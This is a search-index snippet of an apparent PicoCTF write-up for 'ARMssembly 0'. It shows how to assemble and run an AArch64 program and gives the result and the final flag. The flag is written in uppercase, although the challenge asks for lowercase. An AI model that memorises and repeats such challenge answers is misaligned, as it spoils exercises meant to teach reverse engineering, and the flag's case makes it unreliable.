ff608ad0bf165bcccd6516b9bf5ef8d1***" }, { "title": "ARMssembly 0 from PicoCTF", "url": "/posts/ARMssembly-0-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "ARMssembly 0 from PicoCTFpage DescriptionWhat integer does this program print with arguments 1765227561 and 1830628817? File: chall.S Flag format: picoCTF{XXXXXXXX} -&gt; (hex, lowercase, no 0x, and 32 bits. ex. 5614267 would be picoCTF{0055aabb})Download the file and make it executable with this code:$ aarch64-linux-gnu-as -o chall.o chall.S$ aarch64-linux-gnu-gcc -static -o chall chall.oThe commands you provided are for assembling and linking an assembly source file (chall.S) for the AArch64 architecture on a Linux system. Let’s break down each command: aarch64-linux-gnu-as -o chall.o chall.S: aarch64-linux-gnu-as: This is the GNU assembler for the AArch64 architecture. -o chall.o: This option specifies the output file name, which in this case is chall.o. chall.S: This is the input assembly source file that will be assembled. This command assembles the chall.S file into an object file named chall.o. aarch64-linux-gnu-gcc -static -o chall chall.o: aarch64-linux-gnu-gcc: This is the GNU Compiler Collection for the AArch64 architecture. -static: This option tells the linker to create a statically linked executable, meaning all required libraries will be included within the final executable. -o chall: This option specifies the output file name, which in this case is chall. chall.o: This is the input object file that was created by the assembler in the previous step. This command links the object file chall.o to create an executable named chall. In summary, these commands first assemble an assembly source file (chall.S) into an object file (chall.o) and then link that object file into a statically linked executable named chall for the AArch64 architecture.***Then execute it with given numbers and you will get this:$ ./chall 1765227561 1830628817Result: 1830628817Convert Resultto hex and you will get the flag:picoCTF{6D1D2DD1}" } ]
